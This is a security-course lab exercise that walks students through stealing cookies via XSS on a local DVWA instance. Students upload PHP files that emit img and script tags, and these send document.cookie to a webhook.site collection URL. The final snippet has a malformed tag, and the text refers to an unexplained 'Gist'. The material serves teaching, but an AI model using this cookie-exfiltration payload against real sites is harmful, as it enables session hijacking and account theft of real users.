# Cookie Phishing
Welcome!

In this exercise, you have been tasked with assessing a site for XSS vulnerabilities. As part of your task, you will need to show _how_ the website is vulnerable, and how a malicious actor could take advantage of the vulnerability. 

In particular, you will attempt to exploit an XSS vulnerability to steal a user's cookies by:
- Creating a "webhook", which will serve as a malicious server to receive user/victims cookies.
- Building an `img` tag that sends an HTTP request to your webhook.
- Updating the `img` tag to include the user's cookies in a query string.
- Injecting a `script` tag that dumps the image tag to the page. 

## Prework

Before we begin, we will need to set a cookie for us to try and steal. As the victim you will need to open your DVWA instance that is installed onto your VM. Right click on the page and click `Inspect Element` from the drop down menu. Click on `Console`, type the following and press **Enter**:

`document.cookie = "test: password;"`

This will set the cookie for us to steal. If you have visited other websites that have saved cookies onto your VM, this activity will steal those cookies instead. 

## Instructions

In order to steal the cookie information, complete the following:

- Navigate to <https://webhook.site/>. Copy the unique URL provided on the page. This is the URL you'll send requests containing user cookies to.

- Navigate to your DVWA instance. 

- Create a new named `exploit.php` that includes the PHP below:

```
<?php
$html = <<<EOF
<img src ="<Your Webhook URL>" />
EOF;

echo $html;
```

- Save the file. 

- Navigate to **File Upload** tab on the left hand of the DVWA instance. Upload your exploit.php file. Activate your malicious script by going to `localhost/hackable/uploads/exploit.php`. You should see a broken image on the page.

- Return to your Webhook. You should see a new request appear on the left sidebar. This was sent by your image tag, so you know that it's successfully communicating with your "malicious" server.

- Update your file as follows:

```
<?php
$html = <<<EOF
<img src ="<Your Webhook URL>?cookie="+(document.cookie||"no cookie!") />
EOF;

echo $html;
```

- Save the file, and use it to re-upload it to DVWA. Navigate back to `localhost/hackable/uploads/exploit.php`. Your Webhook should receive another request. but _not_ include any cookies (yet!). This is just to verify that your update didn't break the image tag.

- Finally, edit your Gist again. Update it as follows. This will cause the XSS to actually include the user's cookie in the request, or let you know that they don't have anything to steal.

```
<?php
$html = <<<EOF
<script>document.write('<<Your Webhook URL>?cookie='+(document.cookie||'no cookie!') + '"/>')</script>
EOF;

echo $html;
```

- Save your file, and re-upload it one last time. Navigate back to `localhost/hackable/uploads/exploit.php` to activate it. 

- Check your Webhook to ensure you're receiving requests.
  - What do you notice as your `cookie` value?
  - **Note**: If things aren't working as expected, triple-check your quote marks!

- When you verify that you're receiving requests, drop the link in Slack, and watch your logs.
